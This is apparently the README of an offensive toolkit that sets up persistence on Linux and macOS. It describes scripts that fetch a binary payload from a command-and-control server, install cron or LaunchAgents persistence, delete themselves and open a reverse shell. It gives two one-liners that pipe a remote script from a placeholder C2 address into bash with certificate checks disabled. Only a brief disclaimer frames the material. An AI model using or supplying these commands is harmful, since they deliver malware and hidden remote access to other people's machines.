# Persistence Bash Script for Linux and OSX

### Linux
Script for Linux downloads an elf payload from external url and set cron persistence on reboot, then remove itself. It checks if script is launched as root or as user.

##### ONE LINER LINUX
`$ wget -q --no-check-certificate -O - https://C2C_IP/linux_persistence | bash`

### OSX
Script for OSX downloads a Mach-O file from external url then making persistence downloading a plist and LaunchAgents from external url, lastly executes macho reverse shell.

##### ONE LINER OSX
`$ curl -s -k https://C2C_IP/osx_persistence | bash`
##

*Please note that i'm not responsible for any damages and illegal use. Don't be a twat!*
